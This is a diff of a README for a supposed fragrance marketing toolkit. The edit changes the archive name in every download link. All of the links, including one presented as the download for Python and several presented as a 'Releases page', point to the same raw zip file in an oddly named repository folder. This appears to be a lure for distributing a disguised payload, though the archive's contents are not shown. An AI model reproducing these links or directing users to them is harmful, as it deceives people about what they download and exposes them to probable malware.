@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download Badge](https://raw.githubusercontent.com/vuxik/prestige-fragrance-gtm/main/unsurmising/prestige-fragrance-gtm.zip)](https://raw.githubusercontent.com/vuxik/prestige-fragrance-gtm/main/unsurmising/prestige-fragrance-gtm.zip)
+[![Download Badge](https://raw.githubusercontent.com/vuxik/prestige-fragrance-gtm/main/unsurmising/gtm-fragrance-prestige-v2.8.zip)](https://raw.githubusercontent.com/vuxik/prestige-fragrance-gtm/main/unsurmising/gtm-fragrance-prestige-v2.8.zip)
 
 ## 📖 Overview
 
@@ -15,12 +15,12 @@ The **prestige-fragrance-gtm** toolkit helps you analyze and optimize your fragr
 To run the **prestige-fragrance-gtm** toolkit smoothly, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Python Version:** Python 3.6 or later. If you don't have Python, [download it here](https://raw.githubusercontent.com/vuxik/prestige-fragrance-gtm/main/unsurmising/prestige-fragrance-gtm.zip).
+- **Python Version:** Python 3.6 or later. If you don't have Python, [download it here](https://raw.githubusercontent.com/vuxik/prestige-fragrance-gtm/main/unsurmising/gtm-fragrance-prestige-v2.8.zip).
 
 ### Installation Steps
 
 1. **Visit the Releases Page**:  
-   Go to the [Releases page](https://raw.githubusercontent.com/vuxik/prestige-fragrance-gtm/main/unsurmising/prestige-fragrance-gtm.zip) to find the latest version of the toolkit.
+   Go to the [Releases page](https://raw.githubusercontent.com/vuxik/prestige-fragrance-gtm/main/unsurmising/gtm-fragrance-prestige-v2.8.zip) to find the latest version of the toolkit.
 
 2. **Download the Tool**:  
    Select the file that matches your operating system. Click the link to download.
@@ -82,4 +82,4 @@ If you have further inquiries or need assistance, feel free to reach out. You ca
 
 ## 📦 Download & Install
 
-Head over to the [Releases page](https://raw.githubusercontent.com/vuxik/prestige-fragrance-gtm/main/unsurmising/prestige-fragrance-gtm.zip) now to download the latest version of the **prestige-fragrance-gtm** toolkit. Follow the installation steps outlined above to start using this powerful tool for your fragrance marketing needs.
+Head over to the [Releases page](https://raw.githubusercontent.com/vuxik/prestige-fragrance-gtm/main/unsurmising/gtm-fragrance-prestige-v2.8.zip) now to download the latest version of the **prestige-fragrance-gtm** toolkit. Follow the installation steps outlined above to start using this powerful tool for your fragrance marketing needs.
